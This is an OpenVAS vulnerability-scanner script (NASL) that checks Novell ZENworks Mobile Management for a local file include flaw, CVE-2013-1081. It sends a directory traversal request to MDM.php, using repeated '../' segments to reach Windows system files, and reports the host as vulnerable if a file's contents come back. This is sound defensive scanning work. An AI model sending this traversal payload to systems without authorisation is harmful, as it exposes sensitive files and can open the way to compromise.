###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_novell_zenworks_mobile_management_58402.nasl 11 2013-10-27 10:12:02Z jan $
#
# Novell ZENworks Mobile Management  Local File Include Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "Novell ZENworks Mobile Management is prone to a local file include
vulnerability because it fails to adequately validate user-
supplied input.

An attacker can exploit this vulnerability to obtain potentially
sensitive information and execute arbitrary local scripts. This could
allow the attacker to compromise the application and the computer;
other attacks are also possible.

Novell ZENworks Mobile Management 2.6.0, 2.6.1 and 2.7.0 are
vulnerable.";


tag_solution = "Updates are available. Please see the references or vendor advisory
for more information.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103734";
CPE = "cpe:/a:novell:zenworks_mobile_management";

if (description)
{
 script_oid(SCRIPT_OID);
 script_bugtraq_id(58402);
 script_cve_id("CVE-2013-1081");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_version ("$Revision: 11 $");

 script_name("Novell ZENworks Mobile Management  Local File Include Vulnerability");

desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;
 script_xref(name:"URL", value:"http://www.securityfocus.com/bid/58402");
 script_xref(name:"URL", value:"http://www.novell.com/support/kb/doc.php?id=7011895");
 
 script_tag(name:"risk_factor", value:"High");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
 script_tag(name:"creation_date", value:"2013-06-10 13:05:34 +0200 (Mon, 10 Jun 2013)");
 script_description(desc);
 script_summary("Determine if it is possible to read a local file");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
 script_dependencies("gb_novell_zenworks_mobile_management_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_keys("zenworks_mobile_management/installed");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0){
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("global_settings.inc");

if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);

files = traversal_files('windows');

foreach file (keys(files)) {

  url = '/mobile/MDM.php?language=res/languages/' + crap(data:"../", length:6*9) + files[file]; 

  if(http_vuln_check(port:port, url:url,pattern:file)) {
     
   security_hole(port:port);
   exit(0);

 }  

}

exit(99);

